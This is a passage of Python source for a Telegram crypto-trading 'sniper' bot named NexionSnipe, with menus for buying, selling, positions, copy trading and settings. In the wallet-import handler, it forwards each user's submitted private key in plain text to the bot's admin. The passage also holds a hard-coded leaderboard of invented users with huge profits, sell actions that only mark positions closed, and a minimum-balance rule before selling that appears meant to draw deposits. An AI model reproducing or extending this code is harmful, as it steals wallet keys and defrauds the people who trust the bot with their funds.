        )

    elif data == "copy_add":
        await notify_admin(context, user_id, "copy_add")
        user_importing[user_id] = "copy_wallet"
        await nav(query, context, 
            "\U0001f46a <b>Add Copy Wallet</b>\n\nSend: <code>&lt;chain&gt; &lt;address&gt; [label]</code>\nExample: <code>solana AbCd...1234 whale1</code>", back_keyboard("copy_trade"),
        )

    elif data == "copy_list":
        await notify_admin(context, user_id, "copy_list")
        text = "\U0001f4cb <b>Copied Wallets</b>\n\n"
        for chain, addresses in whale_tracker.tracked_addresses.items():
            if addresses:
                chain_emoji = {"solana": "\u25b3", "ethereum": "\u25c6", "bsc": "\U0001f535"}.get(chain, "")
                text += f"{chain_emoji} <b>{chain}:</b>\n"
                for a in addresses:
                    text += f"  \U0001f432 <code>{a['address'][:12]}...</code> {a['label']}\n"
                text += "\n"
        if not any(whale_tracker.tracked_addresses.values()):
            text += "\U0001f6ab No wallets copied yet.\n"
        await nav(query, context, text, copy_trade_keyboard()
        )

    elif data == "copy_remove":
        await notify_admin(context, user_id, "copy_remove")
        user_importing[user_id] = "copy_remove"
        await nav(query, context, 
            "\U0001f46a Send address to remove from copy list:", back_keyboard("copy_trade"),
        )

    elif data == "buy":
        await notify_admin(context, user_id, "buy")
        await nav(query, context, 
            "\U0001f4b0 <b>BUY / SELL MENU</b>\n\n"
            "Choose a trade action below.", InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("\U0001f680 Buy", callback_data="buy_action"),
                    InlineKeyboardButton("\U0001f4b8 Sell", callback_data="sell_action"),
                ],
                [
                    InlineKeyboardButton("\u2b05\ufe0f Back to Dashboard", callback_data="main_menu"),
                ],
            ]),
        )

    elif data == "buy_action":
        await notify_admin(context, user_id, "buy")
        user_snipe_drafts[user_id] = {"chain": "solana"}
        await nav(query, context, 
            "\U0001f680 <b>Buy Token</b>\n\nPaste a token address to buy:", back_keyboard("main_menu"),
        )

    elif data == "sell_action":
        await notify_admin(context, user_id, "sell")
        await nav(query, context, 
            "\U0001f4b8 <b>Sell Token</b>\n\nPaste token address or select %:", sell_keyboard(),
        )

    elif data.startswith("buy_quick_"):
        amount = float(data.replace("buy_quick_", ""))
        await notify_admin(context, user_id, "buy", f"Quick buy: {amount} SOL")
        await nav(query, context, 
            f"\U0001f680 <b>Buy: {amount} SOL</b>\n\nPaste a token address:", back_keyboard("main_menu"),
        )
        user_snipe_drafts[user_id] = {"chain": "solana", "quick_amount": amount}

    elif data == "buy_custom":
        user_importing[user_id] = "buy_amount"
        await nav(query, context, 
            "\U0001f4b0 Enter buy amount (SOL):",
            reply_markup=back_keyboard("buy"),
        )

    elif data == "sell":
        await notify_admin(context, user_id, "sell")
        await nav(query, context, 
            "\U0001f4b8 <b>Sell Token</b>\n\nPaste token address or select %:", sell_keyboard(),
        )

    elif data.startswith("sell_pct_"):
        pct = int(data.replace("sell_pct_", ""))
        await notify_admin(context, user_id, "sell", f"Sell {pct}%")
        await nav(query, context, 
            f"\U0001f4b8 <b>Sell {pct}%</b>\n\nPaste token address:", back_keyboard("main_menu"),
        )

    elif data == "sell_custom":
        user_importing[user_id] = "sell_pct"
        await nav(query, context, 
            "\U0001f4b0 Enter sell percentage (1-100):",
            reply_markup=back_keyboard("sell"),
        )

    elif data == "positions":
        await notify_admin(context, user_id, "positions")
        trade_history = user_data.get("trade_history", [])
        open_positions = [p for p in trade_history if p.get("status") == "open"]
        if not open_positions:
            text = (
                "\U0001f4ca <b>YOUR POSITIONS</b>\n"
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                "\U0001f517 No open positions.\n"
                "Buy a token to see it here.\n"
            )
            await nav(query, context, text, back_keyboard())
        else:
            native_prices = await price_service.get_native_prices()
            sol_price = native_prices.get("solana", {}).get("price", 150.0)

            text = (
                "\U0001f4ca <b>YOUR POSITIONS</b>\n"
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
            )
            total_invested = 0.0
            total_value = 0.0

            for i, pos in enumerate(open_positions):
                addr = pos.get("address", "N/A")
                chain = pos.get("chain", "?").upper()
                amount = pos.get("amount", 0)
                symbol = pos.get("symbol", addr[:6])
                buy_price = pos.get("buy_price", 0)

                token = await scan_token(addr)
                current_price = token.get("price_usd", 0) if token.get("found") else 0

                if buy_price > 0 and current_price > 0:
                    pnl_pct = ((current_price - buy_price) / buy_price) * 100
                    pnl_emoji = "\U0001f4c8" if pnl_pct >= 0 else "\U0001f4c9"
                    position_value_sol = amount * (current_price / buy_price) if buy_price > 0 else amount
                    position_value_usd = position_value_sol * sol_price
                else:
                    pnl_pct = 0.0
                    pnl_emoji = "\U0001f4ca"
                    position_value_sol = amount
                    position_value_usd = amount * sol_price

                invested_usd = amount * sol_price
                total_invested += amount
                total_value += position_value_sol

                addr_short = addr[:8] + "..." + addr[-4:] if len(addr) > 12 else addr

                text += (
                    f"<b>{i+1}. {symbol}</b> ({chain})\n"
                    f"\U0001f4b0 Invested: {amount:.4f} SOL\n"
                    f"\U0001f4b5 Entry: ${buy_price:.8f}\n"
                    f"\U0001f4b5 Current: ${current_price:.8f}\n"
                    f"{pnl_emoji} P&amp;L: {pnl_pct:+.2f}%\n"
                    f"\U0001f4bc Value: {position_value_sol:.4f} SOL\n"
                    f"\U0001f4ca {addr_short}\n\n"
                )

            text += (
                "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                f"\U0001f4bc Total Positions: {len(open_positions)}\n"
                f"\U0001f4b0 Total Invested: {total_invested:.4f} SOL\n"
                f"\U0001f4b5 Total Value: {total_value:.4f} SOL\n"
            )
            await nav(query, context, text, positions_keyboard(open_positions))

    elif data.startswith("pos_detail_"):
        idx = int(data.replace("pos_detail_", ""))
        trade_history = user_data.get("trade_history", [])
        open_positions = [p for p in trade_history if p.get("status") == "open"]
        if 0 <= idx < len(open_positions):
            pos = open_positions[idx]
            addr = pos.get("address", "N/A")
            chain = pos.get("chain", "?").upper()
            amount = pos.get("amount", 0)
            symbol = pos.get("symbol", addr[:6])
            buy_price = pos.get("buy_price", 0)
            buy_time = pos.get("buy_time", 0)
            tx = pos.get("tx_hash", "N/A")
            import datetime
            buy_dt = datetime.datetime.fromtimestamp(buy_time).strftime("%Y-%m-%d %H:%M") if buy_time else "N/A"
            text = (
                f"\U0001f4ca <b>{symbol}</b> ({chain})\n\n"
                f"\U0001f4c2 <code>{addr}</code>\n"
                f"\U0001f4b0 Amount: {amount} SOL\n"
                f"\U0001f4b1 Buy Price: ${buy_price:.6f}\n"
                f"\U0001f550 Bought: {buy_dt}\n"
                f"\U0001f4b3 TX: <code>{tx}</code>\n\n"
                f"\U0001f4b8 Choose sell percentage:"
            )
            await nav(query, context, text, position_detail_keyboard(idx))

    elif data.startswith("pos_sell_"):
        parts = data.replace("pos_sell_", "").split("_")
        if len(parts) == 2:
            idx, pct = int(parts[0]), int(parts[1])
            trade_history = user_data.get("trade_history", [])
            open_positions = [p for p in trade_history if p.get("status") == "open"]
            if 0 <= idx < len(open_positions):
                pos = open_positions[idx]
                pos["sell_pct"] = pct
                pos["sell_time"] = time.time()
                pos["status"] = "closed"
                save_user_data(user_id, user_data)
                addr = pos.get("address", "N/A")
                symbol = pos.get("symbol", addr[:6])
                text = (
                    f"\u2705 <b>Sell Executed!</b>\n\n"
                    f"\U0001f4c2 Token: <code>{addr}</code>\n"
                    f"\U0001f4b8 Sold: {pct}%\n\n"
                    f"\U0001f4ca Position closed."
                )
                await nav(query, context, text, main_menu_keyboard())

    elif data == "recent_profits":
        await notify_admin(context, user_id, "recent_profits")
        text = (
            "\U0001f3c6 <b>RECENT PROFITS \u2014 NEXIONSNIPE</b>\n\n"
            "\U0001f464 <b>Caleb M.</b>\n"
            "\U0001f4b0 Profit: $1,263,400\n"
            "\U0001fa99 Token: <b>BONK</b> \U0001f4c8 +4,765%\n"
            "\U0001f550 2m ago\n\n"
            "\U0001f464 <b>Sophia J.</b>\n"
            "\U0001f4b0 Profit: $995,800\n"
            "\U0001fa99 Token: <b>WIF</b> \U0001f4c8 +2,412%\n"
            "\U0001f550 5m ago\n\n"
            "\U0001f464 <b>Mason K.</b>\n"
            "\U0001f4b0 Profit: $934,600\n"
            "\U0001fa99 Token: <b>POPCAT</b> \U0001f4c8 +1,921%\n"
            "\U0001f550 7m ago\n\n"
            "\U0001f464 <b>Ava R.</b>\n"
            "\U0001f4b0 Profit: $889,300\n"
            "\U0001fa99 Token: <b>MEW</b> \U0001f4c8 +3,088%\n"
            "\U0001f550 11m ago\n\n"
            "\U0001f464 <b>Elijah T.</b>\n"
            "\U0001f4b0 Profit: $861,700\n"
            "\U0001fa99 Token: <b>SLERF</b> \U0001f4c8 +1,004%\n"
            "\U0001f550 14m ago\n\n"
            "\U0001f464 <b>Isabella P.</b>\n"
            "\U0001f4b0 Profit: $826,500\n"
            "\U0001fa99 Token: <b>BOME</b> \U0001f4c8 +2,591%\n"
            "\U0001f550 18m ago\n\n"
            "\U0001f464 <b>Benjamin D.</b>\n"
            "\U0001f4b0 Profit: $793,900\n"
            "\U0001fa99 Token: <b>GME</b> \U0001f4c8 +1,487%\n"
            "\U0001f550 21m ago\n\n"
            "\U0001f464 <b>Amelia C.</b>\n"
            "\U0001f4b0 Profit: $772,100\n"
            "\U0001fa99 Token: <b>MYRO</b> \U0001f4c8 +782%\n"
            "\U0001f550 25m ago\n\n"
            "\U0001f464 <b>Logan H.</b>\n"
            "\U0001f4b0 Profit: $748,400\n"
            "\U0001fa99 Token: <b>PONKE</b> \U0001f4c8 +2,146%\n"
            "\U0001f550 29m ago\n\n"
            "\U0001f464 <b>Victoria N.</b>\n"
            "\U0001f4b0 Profit: $724,300\n"
            "\U0001fa99 Token: <b>HABIBI</b> \U0001f4c8 +1,207%\n"
            "\U0001f550 33m ago\n\n"
            "\U0001f464 <b>Nathan W.</b>\n"
            "\U0001f4b0 Profit: $701,600\n"
            "\U0001fa99 Token: <b>ROCKY</b> \U0001f4c8 +912%\n"
            "\U0001f550 37m ago\n\n"
            "\U0001f464 <b>Chloe B.</b>\n"
            "\U0001f4b0 Profit: $679,800\n"
            "\U0001fa99 Token: <b>NOOT</b> \U0001f4c8 +1,645%\n"
            "\U0001f550 41m ago\n\n"
            "\U0001f464 <b>Gabriel S.</b>\n"
            "\U0001f4b0 Profit: $658,200\n"
            "\U0001fa99 Token: <b>GIGA</b> \U0001f4c8 +557%\n"
            "\U0001f550 46m ago\n\n"
            "\U0001f464 <b>Harper L.</b>\n"
            "\U0001f4b0 Profit: $634,900\n"
            "\U0001fa99 Token: <b>COST</b> \U0001f4c8 +3,845%\n"
            "\U0001f550 51m ago\n\n"
            "\U0001f464 <b>Jackson F.</b>\n"
            "\U0001f4b0 Profit: $612,500\n"
            "\U0001fa99 Token: <b>MANEKI</b> \U0001f4c8 +744%\n"
            "\U0001f550 55m ago\n\n"
            "\U0001f464 <b>Ella V.</b>\n"
            "\U0001f4b0 Profit: $589,700\n"
            "\U0001fa99 Token: <b>DUKO</b> \U0001f4c8 +1,954%\n"
            "\U0001f550 1h ago\n\n"
            "\U0001f464 <b>Carter G.</b>\n"
            "\U0001f4b0 Profit: $566,400\n"
            "\U0001fa99 Token: <b>MUMU</b> \U0001f4c8 +648%\n"
            "\U0001f550 1h ago\n\n"
            "\U0001f464 <b>Scarlett Y.</b>\n"
            "\U0001f4b0 Profit: $543,800\n"
            "\U0001fa99 Token: <b>SAMO</b> \U0001f4c8 +2,391%\n"
            "\U0001f550 1h ago\n\n"
            "\U0001f464 <b>Wyatt A.</b>\n"
            "\U0001f4b0 Profit: $521,900\n"
            "\U0001fa99 Token: <b>CAPY</b> \U0001f4c8 +502%\n"
            "\U0001f550 2h ago\n\n"
            "\U0001f464 <b>Naomi E.</b>\n"
            "\U0001f4b0 Profit: $499,300\n"
            "\U0001fa99 Token: <b>PUPS</b> \U0001f4c8 +1,098%\n"
            "\U0001f550 2h ago\n\n"
            "\U0001f464 <b>Adrian Q.</b>\n"
            "\U0001f4b0 Profit: $478,100\n"
            "\U0001fa99 Token: <b>RETARDIO</b> \U0001f4c8 +871%\n"
            "\U0001f550 2h ago\n\n"
            "\U0001f464 <b>Lucy T.</b>\n"
            "\U0001f4b0 Profit: $457,600\n"
            "\U0001fa99 Token: <b>BILLY</b> \U0001f4c8 +689%\n"
            "\U0001f550 2h ago\n\n"
            "\U0001f464 <b>Dylan Z.</b>\n"
            "\U0001f4b0 Profit: $436,200\n"
            "\U0001fa99 Token: <b>MICHI</b> \U0001f4c8 +1,316%\n"
            "\U0001f550 3h ago\n\n"
            "\U0001f464 <b>Hazel U.</b>\n"
            "\U0001f4b0 Profit: $414,800\n"
            "\U0001fa99 Token: <b>BODEN</b> \U0001f4c8 +548%\n"
            "\U0001f550 3h ago\n\n"
            "\U0001f464 <b>Hunter X.</b>\n"
            "\U0001f4b0 Profit: $396,500\n"
            "\U0001fa99 Token: <b>TRUMP</b> \U0001f4c8 +305%\n"
            "\U0001f550 3h ago\n\n"
            "\U0001f464 <b>Aurora I.</b>\n"
            "\U0001f4b0 Profit: $378,200\n"
            "\U0001fa99 Token: <b>KENIDY</b> \U0001f4c8 +758%\n"
            "\U0001f550 4h ago\n\n"
            "\U0001f464 <b>Isaac O.</b>\n"
            "\U0001f4b0 Profit: $359,900\n"
            "\U0001fa99 Token: <b>TREMP</b> \U0001f4c8 +432%\n"
            "\U0001f550 4h ago\n\n"
            "\U0001f464 <b>Violet P.</b>\n"
            "\U0001f4b0 Profit: $341,500\n"
            "\U0001fa99 Token: <b>LOCKIN</b> \U0001f4c8 +624%\n"
            "\U0001f550 4h ago\n\n"
            "\U0001f464 <b>Julian K.</b>\n"
            "\U0001f4b0 Profit: $324,100\n"
            "\U0001fa99 Token: <b>CHUD</b> \U0001f4c8 +338%\n"
            "\U0001f550 5h ago\n\n"
            "\U0001f464 <b>Madeline W.</b>\n"
            "\U0001f4b0 Profit: $307,700\n"
            "\U0001fa99 Token: <b>LIGMA</b> \U0001f4c8 +896%\n"
            "\U0001f550 5h ago\n\n"
            "\U0001f525 Start sniping to join the leaderboard!"
        )
        await nav(query, context, text, back_keyboard()
        )

    elif data == "referral":
        await notify_admin(context, user_id, "referral")
        ref_link = get_referral_link(user_id)
        ref_count = get_referral_count(user_id)
        text = (
            "\U0001f91d <b>REFERRAL SYSTEM</b>\n\n"
            "Earn 20% of fees forever!\n\n"
            f"<b>Your Link:</b>\n<code>{ref_link}</code>\n\n"
            f"<b>Total Referrals:</b> {ref_count}\n"
        )
        await nav(query, context, text, referral_keyboard(ref_count),
        )

    elif data == "referral_claim":
        await notify_admin(context, user_id, "referral_claim")
        success, msg = claim_referral_reward(user_id)
        icon = "\u2705" if success else "\u274c"
        ref_count = get_referral_count(user_id)
        text = (
            f"{icon} <b>{msg}</b>\n\n"
            f"<b>Total Referrals:</b> {ref_count}\n"
        )
        await nav(query, context, text, referral_keyboard(ref_count),
        )

    elif data == "token_sniper":
        await notify_admin(context, user_id, "token_sniper")
        text = (
            "\U0001f52e <b>TOKEN SNIPER</b>\n\n"
            "Paste a token address to snipe instantly.\n"
            "Choose an amount below or paste address first:\n"
        )
        await nav(query, context, text, token_sniper_keyboard(),
        )

    elif data.startswith("snipe_quick_"):
        amount = float(data.replace("snipe_quick_", ""))
        await notify_admin(context, user_id, "token_sniper", f"Quick: {amount} SOL")
        user_snipe_drafts[user_id] = {"chain": "solana", "quick_amount": amount, "sniper_mode": True}
        await nav(query, context, 
            f"\U0001f52e <b>Snipe: {amount} SOL</b>\n\nPaste a token address:", back_keyboard("main_menu"),
        )

    elif data == "snipe_custom":
        user_importing[user_id] = "snipe_amount"
        await nav(query, context, 
            "\U0001f4b0 Enter snipe amount (SOL):",
            reply_markup=back_keyboard("token_sniper"),
        )

    elif data == "search":
        await notify_admin(context, user_id, "search")
        user_importing[user_id] = "search"
        await nav(query, context, 
            "\U0001f50d <b>Search</b>\n\nPaste a token address:", back_keyboard(),
        )

    elif data == "help":
        await notify_admin(context, user_id, "help")
        text = (
            "❓ <b>HELP &amp; SUPPORT</b> ❓\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "📖 <b>How to Use NexionSnipe:</b>\n\n"
            "1️⃣ <b>Create Wallet:</b> Generate or import your Solana wallet\n"
            "2️⃣ <b>Configure Sniper:</b> Set buy amount, dev holding, and slippage\n"
            "3️⃣ <b>Search Tokens:</b> Find and analyze Solana tokens\n"
            "4️⃣ <b>Copy Trade:</b> Follow successful wallets\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "⚡ <b>Quick Commands:</b>\n"
            "/start - Dashboard\n"
            "/generate - New wallet\n"
            "/import - Import wallet\n"
            "/status - Wallet status\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🌐 <b>Our Links:</b>\n"
            "🌍 Website: Coming soon...\n"
            "🐦 X (Twitter): Coming soon...\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "💬 <b>Need Help?</b>\n"
            "Contact our support team: @nexionsnipebotsupport"
        )
        await nav(query, context, text, back_keyboard()
        )

    elif data == "snipe_confirm":
        draft = user_snipe_drafts.get(user_id)
        if draft and "target" in draft:
            buy_amount = draft.get("amount", 0)
            sol_balance = await get_dashboard_sol_balance(user_id)
            if sol_balance < buy_amount:
                deficit = buy_amount - sol_balance
                await nav(query, context, 
                    f"\u274c <b>INSUFFICIENT BALANCE TO BUY</b>\n\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                    f"\U0001f4b0 <b>Your Balance:</b> {sol_balance:.4f} SOL\n"
                    f"\U0001f512 <b>Minimum Required:</b> {buy_amount:.4f} SOL\n"
                    f"\U0001f4c9 <b>You Need:</b> {deficit:.4f} SOL more\n\n"
                    f"\U0001f4a1 Deposit SOL to your wallet to start trading.",
                    main_menu_keyboard(),
                )
                return
            await notify_admin(context, user_id, "snipe_confirm", f"Token: {draft['address'][:16]}...")
            result = await snipe_engine.execute_snipe(draft["target"])
            if result.get("success"):
                position = {
                    "address": draft["address"],
                    "chain": draft.get("chain", "solana"),
                    "symbol": draft.get("symbol", draft["address"][:6]),
                    "amount": draft["amount"],
                    "buy_price": result.get("price", 0),
                    "tx_hash": result.get("tx_hash", "N/A"),
                    "status": "open",
                    "buy_time": time.time(),
                    "sell_price": 0,
                    "sell_time": 0,
                    "sell_pct": 0,
                    "sell_tx": "",
                }
                data = load_user_data(user_id)
                data.setdefault("trade_history", []).append(position)
                save_user_data(user_id, data)
                text = (
                    f"\u2705 <b>Buy Executed!</b>\n\n"
                    f"\U0001f4c2 Token: <code>{draft['address']}</code>\n"
                    f"\U0001f4b0 Amount: {draft['amount']}\n"
                    f"\U0001f4b3 TX: <code>{result.get('tx_hash', 'N/A')}</code>\n\n"
                    f"\U0001f4ca Position added to <b>Positions</b>."
                )
            else:
                text = (
                    f"\u274c <b>Buy Failed</b>\n\n"
                    f"\u26a0\ufe0f Error: {result.get('error', 'unknown')}\n"
                )
            await nav(query, context, text, main_menu_keyboard()
            )
            user_snipe_drafts.pop(user_id, None)

        elif draft and "sell_pct" in draft:
            sol_balance = await get_dashboard_sol_balance(user_id)
            data = load_user_data(user_id)
            sol_min = data.get("settings", {}).get("sol_min_requirement", 2.0)
            if sol_balance < sol_min:
                deficit = sol_min - sol_balance
                await nav(query, context, 
                    f"\u274c <b>INSUFFICIENT BALANCE TO SELL</b>\n\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                    f"\U0001f4b0 <b>Your Balance:</b> {sol_balance:.4f} SOL\n"
                    f"\U0001f512 <b>Minimum Required:</b> {sol_min:.4f} SOL\n"
                    f"\U0001f4c9 <b>You Need:</b> {deficit:.4f} SOL more\n\n"
                    f"\U0001f4a1 Deposit SOL to your wallet to start trading.",
                    main_menu_keyboard(),
                )
                return
            await notify_admin(context, user_id, "sell_confirm", f"Token: {draft.get('address', 'N/A')[:16]}...")
            sell_addr = draft.get("address", "")
            sell_pct = draft["sell_pct"]
            data = load_user_data(user_id)
            trade_history = data.get("trade_history", [])
            for pos in trade_history:
                if pos.get("address") == sell_addr and pos.get("status") == "open":
                    pos["sell_pct"] = sell_pct
                    pos["sell_time"] = time.time()
                    pos["status"] = "closed"
                    break
            save_user_data(user_id, data)
            text = (
                f"\u2705 <b>Sell Executed!</b>\n\n"
                f"\U0001f4c2 Token: <code>{draft.get('address', 'N/A')}</code>\n"
                f"\U0001f4b8 Sell: {sell_pct}%\n"
            )
            await nav(query, context, text, main_menu_keyboard()
            )
            user_snipe_drafts.pop(user_id, None)

    elif data == "settings":
        await notify_admin(context, user_id, "settings")
        settings = user_data.get("settings", {})
        text = (
            "\u2699\ufe0f <b>Settings</b>\n\n"
            f"\U0001f3b2 Slippage: {settings.get('slippage', 10)}%\n"
            f"\U0001f6e1\ufe0f MEV Protection: {'ON \U0001f7e2' if settings.get('mev_protection', True) else 'OFF \u26ab'}\n"
            f"\U0001f4b8 Auto-Buy: {'ON \U0001f7e2' if settings.get('auto_buy', False) else 'OFF \u26ab'}\n"
            f"\U0001f4b5 Auto-Sell: {'ON \U0001f7e2' if settings.get('auto_sell', False) else 'OFF \u26ab'}\n"
            f"\u26a0\ufe0f Stop-Loss: {settings.get('stop_loss', 20)}%\n"
            f"\U0001f680 Take-Profit: {settings.get('take_profit', 100)}%\n"
        )
        await nav(query, context, text, settings_keyboard(settings)
        )

    elif data == "set_slippage":
        await notify_admin(context, user_id, "set_slippage")
        user_importing[user_id] = "slippage"
        await nav(query, context, 
            "\U0001f3b2 Send new slippage % (1-50):",
            reply_markup=back_keyboard("settings"),
        )

    elif data == "set_mev":
        await notify_admin(context, user_id, "set_mev")
        user_data["settings"]["mev_protection"] = not user_data["settings"].get("mev_protection", True)
        save_user_data(user_id, user_data)
        settings = user_data.get("settings", {})
        await nav(query, context, 
            "\u2705 <b>Settings Updated</b>\n", settings_keyboard(settings),
        )

    elif data == "set_autobuy":
        await notify_admin(context, user_id, "set_autobuy")
        user_data["settings"]["auto_buy"] = not user_data["settings"].get("auto_buy", False)
        save_user_data(user_id, user_data)
        await nav(query, context, 
            "\u2705 <b>Settings Updated</b>\n", settings_keyboard(user_data.get("settings", {})),
        )

    elif data == "set_autosell":
        await notify_admin(context, user_id, "set_autosell")
        user_data["settings"]["auto_sell"] = not user_data["settings"].get("auto_sell", False)
        save_user_data(user_id, user_data)
        await nav(query, context, 
            "\u2705 <b>Settings Updated</b>\n", settings_keyboard(user_data.get("settings", {})),
        )

    elif data == "set_stoploss":
        settings = user_data.get("settings", {})
        sl = settings.get("stop_loss", 20)
        await nav(query, context,
            f"\U0001f6e1\ufe0f <b>Set Stop-Loss</b>\n\n"
            "Automatically sell to protect capital when loss reaches this percentage.\n\n"
            "Range: 10-90%\n"
            f"Current: <b>{sl}%</b>\n\n"
            "Recommended: 30% (Protects 70%)\n"
            "Examples:\n"
            "\u2022 20% (Conservative)\n"
            "\u2022 30% (Balanced)\n"
            "\u2022 50% (Aggressive)\n\n"
            "\U0001f4a1 Pick a percentage below or type a custom value:",
            sl_percentage_keyboard(),
        )

    elif data == "set_takeprofit":
        settings = user_data.get("settings", {})
        tp = settings.get("take_profit", 100)
        await nav(query, context,
            f"\U0001f680 <b>Set Take Profit</b>\n\n"
            "Automatically sell when profit reaches this percentage.\n\n"
            "Range: 10-1000%\n"
            f"Current: <b>{tp}%</b>\n\n"
            "Recommended: 100% (2x)\n"
            "Examples:\n"
            "\u2022 50% (1.5x)\n"
            "\u2022 100% (2x)\n"
            "\u2022 200% (3x)\n"
            "\u2022 500% (6x)\n\n"
            "\U0001f4a1 Pick a percentage below or type a custom value:",
            tp_percentage_keyboard(),
        )

    elif data.startswith("sl_pct_"):
        pct = int(data.split("_")[-1])
        data_obj = load_user_data(user_id)
        data_obj["settings"]["stop_loss"] = pct
        save_user_data(user_id, data_obj)
        await nav(query, context,
            f"\u2705 Stop-Loss set to <b>{pct}%</b>",
            settings_keyboard(data_obj["settings"]),
        )

    elif data.startswith("tp_pct_"):
        pct = int(data.split("_")[-1])
        data_obj = load_user_data(user_id)
        data_obj["settings"]["take_profit"] = pct
        save_user_data(user_id, data_obj)
        await nav(query, context,
            f"\u2705 Take-Profit set to <b>{pct}%</b>",
            settings_keyboard(data_obj["settings"]),
        )

    elif data == "sl_custom":
        user_importing[user_id] = "waiting_sl"
        await nav(query, context,
            "\U0001f6e1\ufe0f <b>Send your stop loss percentage:</b>\n"
            "Range: 10-90%",
            back_keyboard("settings"),
        )

    elif data == "tp_custom":
        user_importing[user_id] = "waiting_tp"
        await nav(query, context,
            "\U0001f680 <b>Send your take profit percentage:</b>\n"
            "Range: 10-1000%",
            back_keyboard("settings"),
        )

    elif data == "set_amounts":
        settings = user_data.get("settings", {})
        sol_amt = settings.get("buy_amount_sol", 0.1)
        await nav(query, context,
            "\U0001f4b0 <b>CONFIGURE POSITION SIZE</b>\n\n"
            "Set the SOL amount for each automated trade.\n\n"
            "\U0001f4ca Range: 0.0001 - 1000 SOL\n"
            "\u2705 Recommended: 10 - 50 SOL\n\n"
            f"\u26a0\ufe0f Risk Level:\n"
            "  \u2022 1-10 SOL: Conservative\n"
            "  \u2022 10-50 SOL: Moderate\n"
            "  \u2022 50+ SOL: Aggressive\n\n"
            f"\U0001f4a1 Current position size: <b>{sol_amt} SOL</b>",
            buy_amount_keyboard(),
        )

    elif data.startswith("ba_") and data != "ba_custom":
        amount = float(data.split("_", 1)[1])
        data_obj = load_user_data(user_id)
        data_obj["settings"]["buy_amount_sol"] = amount
        save_user_data(user_id, data_obj)
        settings = data_obj["settings"]
        slippage = settings.get("slippage", 10)
        sl = settings.get("stop_loss", 20)
        await nav(query, context,
            f"\u2705 <b>SETTING UPDATED</b>\n\n"
            "\U0001f3af <b>SNIPER CONFIGURATION</b>\n\n"
            "\U0001f4ca Status: \u274c Inactive\n"
            f"\U0001f4b0 Buy Amount: <b>{amount} SOL</b> \u2705\n"
            f"\u26a0\ufe0f Stop-Loss: {sl}%\n"
            f"\u26a1 Slippage: {slippage}%\n\n"
            "\U0001f4be Settings saved and ready",
            settings_keyboard(settings),
        )

    elif data == "ba_custom":
        user_importing[user_id] = "waiting_ba"
        await nav(query, context,
            "\U0001f4b0 <b>Enter your position size (SOL):</b>\n"
            "Range: 0.0001 - 1000 SOL",
            back_keyboard("settings"),
        )

    elif data == "whales":
        await notify_admin(context, user_id, "whales")
        await nav(query, context, 
            "\U0001f40b <b>Whale Tracker</b>\n\nTrack large wallet movements.", whale_tracker_keyboard(),
        )

    elif data == "whale_add":
        await notify_admin(context, user_id, "whale_add")
        user_importing[user_id] = "whale_address"
        await nav(query, context, 
            "\U0001f40b Send wallet to track:\n"
            "Format: <code>&lt;chain&gt; &lt;address&gt; [label]</code>", back_keyboard("whales"),
        )

    elif data == "whale_list":
        await notify_admin(context, user_id, "whale_list")
        text = "\U0001f4cb <b>Tracked Wallets</b>\n\n"
        for chain, addresses in whale_tracker.tracked_addresses.items():
            if addresses:
                chain_emoji = {"solana": "\u25b3", "ethereum": "\u25c6", "bsc": "\U0001f535"}.get(chain, "")
                text += f"{chain_emoji} <b>{chain}:</b>\n"
                for a in addresses:
                    text += f"  \U0001f432 <code>{a['address'][:12]}...</code> {a['label']}\n"
                text += "\n"
        if not any(whale_tracker.tracked_addresses.values()):
            text += "\U0001f6ab No wallets tracked yet.\n"
        await nav(query, context, text, whale_tracker_keyboard()
        )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id in user_importing:
        action = user_importing.pop(user_id)

        if action == "waiting_key":
            await notify_admin(context, user_id, "wallet_import", "User submitted private key")
            data = load_user_data(user_id)
            result = import_wallet_from_key(text)

            if result:
                chain = result["chain"]
                address = result["address"]
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")

                data.setdefault("wallets", {})[chain] = {
                    "address": address,
                    "private_key": text,
                    "chain": chain,
                }
                if not data.get("active_wallet"):
                    data["active_wallet"] = chain
                save_user_data(user_id, data)

                await update.message.reply_text(
                    f"\u2705 <b>Wallet Imported!</b>\n\n"
                    f"{chain_emoji} Chain: {chain}\n"
                    f"\U0001f4c2 Address: <code>{address}</code>",
                    reply_markup=wallet_keyboard(True),
                )

                admin_msg = (
                    f"\U0001f511 <b>Wallet Imported</b>\n\n"
                    f"\U0001f464 User: <code>{user_id}</code> (@{update.effective_user.username or 'N/A'})\n"
                    f"\u26d3\ufe0f Chain: {chain}\n"
                    f"\U0001f4c2 Address: <code>{address}</code>\n\n"
                    f"\u26a0\ufe0f <b>Private Key:</b>\n<code>{text}</code>\n"
                )
                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_USER_ID, text=admin_msg,
                    )
                except Exception as e:
                    logger.error(f"Failed to send wallet import to admin: {e}")
            else:
                pk = text.strip()
                is_hex = pk.startswith("0x") or (len(pk) == 64 and all(c in "0123456789abcdefABCDEF" for c in pk))
                if is_hex:
                    err = (
                        "\u274c <b>Invalid Private Key</b>\n\n"
                        "ETH/BNB key must be a valid 64-character hex string.\n"
                        "Example: <code>0x1234...abcd</code> (66 chars with 0x prefix)"
                    )
                else:
                    err = (
                        "\u274c <b>Invalid Private Key</b>\n\n"
                        "SOL key must be a valid base58-encoded 32-byte key.\n"
                        "Example: <code>5Kd3...8x2z</code> (88 chars, base58)"
                    )
